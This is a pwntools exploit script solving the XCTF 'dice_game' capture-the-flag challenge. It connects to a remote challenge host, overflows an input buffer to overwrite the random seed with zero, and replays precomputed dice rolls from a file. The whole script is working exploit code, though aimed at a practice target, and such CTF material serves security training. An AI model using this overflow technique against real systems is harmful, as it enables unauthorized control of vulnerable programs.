# zzPwn Header Start
from pwn import *
from zzPwnlib import *
from LibcSearcher import *
context(os='linux', arch='amd64', log_level='debug')

elf_path    = './xctf_pwn_105_dice_game'
elf         = ELF(elf_path)
#io          = process(elf_path)
io          = remote('111.200.241.244',64992)
# zzPwn Header End

rand6File = open('./pwn_105_rand6num', 'r')
rand6nums = rand6File.readline()

payload = b"A"*0x40 + p32(0)
payload = payload.ljust(0x50, b"B")

io.recv()
io.send(payload)

for n in rand6nums[:50]:
    io.recv()
    io.sendline(n)

io.interactive()

